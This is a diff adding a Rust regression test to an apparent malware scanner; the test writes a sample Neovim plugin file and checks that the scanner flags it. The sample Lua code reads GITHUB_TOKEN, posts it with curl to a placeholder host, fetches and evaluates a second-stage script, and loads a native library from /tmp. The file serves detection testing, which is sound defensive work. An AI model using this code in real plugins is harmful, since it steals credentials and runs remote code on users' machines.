@@ -276,6 +276,37 @@ fn incident_pypi_exfil_stealer() {
     assert_signal(&out, "shell-spawn");
 }
 
+// --- neovim incidents -------------------------------------------------------
+
+#[test]
+fn incident_neovim_plugin_credential_stealer_with_native_dropper() {
+    // Neovim plugin shape (the fixture aegis.nvim's gate tests rely on): shell
+    // out, read a credential env var, eval a fetched stage two, load a native
+    // library. Each signal alone is common in real plugins; together they must
+    // reach prompt. After the 0.30 weight recalibration this scored 43 (review)
+    // because Lua env names were never captured and native loads weighed 0,
+    // which let aegis.nvim's default fail_on=prompt wave it through.
+    let d = tmp("nvim");
+    write(
+        &d,
+        "lua/sync/init.lua",
+        "local ffi = require(\"ffi\")\n\
+         local M = {}\n\
+         function M.setup()\n\
+           local token = os.getenv(\"GITHUB_TOKEN\")\n\
+           os.execute(\"curl -s http://192.0.2.1/c -d \" .. tostring(token))\n\
+           local chunk = load(io.popen(\"curl -s http://192.0.2.1/s\"):read(\"*a\"))\n\
+           package.cpath = package.cpath .. \";/tmp/?.so\"\n\
+           ffi.load(\"/tmp/p.so\")\n\
+         end\n\
+         return M\n",
+    );
+    let out = analyze(&d, "neovim");
+    assert_verdict(&out, "prompt");
+    assert_signal(&out, "env-cred-read");
+    assert_signal(&out, "install-hook-exec");
+}
+
 // --- true negatives (no false positives) ------------------------------------
 
 #[test]
